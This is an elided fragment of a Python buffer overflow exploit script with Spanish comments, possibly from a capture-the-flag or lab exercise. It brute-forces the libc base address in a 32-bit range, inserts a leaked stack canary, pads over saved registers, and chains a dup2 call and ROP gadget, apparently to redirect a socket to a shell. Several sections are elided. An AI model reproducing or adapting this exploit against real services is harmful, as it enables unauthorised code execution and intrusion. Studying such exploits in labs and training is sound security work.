...
# Tomar el valor del puerto por argumento
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else PORT

known_canary = None

def generar_direcciones_libc(base_start= 0xf7d00000, base_end=0xf7e00000, page_size=0x1000):
...
print(f"[+] Canary value is 0x{canary}")
...
for base in libc_base_guesses:
    ...
    PAYLOAD = b"A" * offset
    PAYLOAD += canary
    PAYLOAD += b"B" * 12 # PADDING EBP EBX AND ?
    PAYLOAD += dup2_cmd
    PAYLOAD += gadget2
    PAYLOAD += p32(4)
    PAYLOAD += p32(0)
